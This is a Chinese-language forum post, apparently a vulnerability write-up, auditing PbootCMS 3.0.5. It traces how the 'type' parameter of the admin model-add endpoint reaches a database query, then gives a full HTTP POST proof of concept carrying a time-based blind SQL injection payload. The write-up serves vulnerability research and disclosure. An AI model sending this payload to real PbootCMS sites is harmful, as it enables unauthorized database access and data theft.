本来想发3.0.4版本的搜索sql注入，但看到已经有大佬发了，去官网看了下刚更新到3.0.5不久，就去看看有没有大佬不要的洞。  
这个思路和3.0.4版本的搜索sql基本上没啥区别。

### 代码审计

\\apps\\admin\\controller\\content\\ModelController.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ff20d5e17692231748c1d35c32513c3d2068ddf6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ff20d5e17692231748c1d35c32513c3d2068ddf6.png)  
\\core\\function\\helper.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3f53561aacebce6a0690b123368fdc79de36aca4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3f53561aacebce6a0690b123368fdc79de36aca4.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2bc873d1b87de3978825dff78473bcf4a61e6583.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2bc873d1b87de3978825dff78473bcf4a61e6583.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2e124abcb23afd2333125b3dd8ce3e232380a1a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2e124abcb23afd2333125b3dd8ce3e232380a1a5.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a2c9f9d94c30d683aedd0c1ef5c6f20eebd5a0be.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a2c9f9d94c30d683aedd0c1ef5c6f20eebd5a0be.png)

接受到数据后会经过一系列的过滤（只能包含中文、字母、数字、水平线、点、逗号和空格）。

\\apps\\admin\\model\\content\\ModelModel.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2e61c8b6fce234971ddbaef33d7c1c0fe010ecc3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2e61c8b6fce234971ddbaef33d7c1c0fe010ecc3.png)  
Type参数可控最终导致了sql注入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ce386099e7196194689370b0d1a43a054f30bf7d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ce386099e7196194689370b0d1a43a054f30bf7d.png)

### 复现

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8fe60acfa1cf7f63e0f5be594c7f783d1df4d306.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8fe60acfa1cf7f63e0f5be594c7f783d1df4d306.png)  
POC:

```php
POST /admin.php?p=/Model/add HTTP/1.1
Host: pbootcms.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://pbootcms.cc/admin.php?p=/Model/index
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Origin: http://pbootcms.cc
Connection: close
Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1625620741,1625709480; lg=cn; PbootSystem=i15vq8q4g528jug6soss3shve6; Hm_lpvt_f6f37dc3416ca514857b78d0b158037e=1625709480; XDEBUG_SESSION=PHPSTORM
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

formcheck=20ef862bac15666418675fc5fbd7eb4c&name=1111111&type=2 AND (SELECT 2704 FROM (SELECT(SLEEP(5)))XhYr)&urlname=1111111111111111111&listtpl=11111111&contenttpl=11111111&status=1
```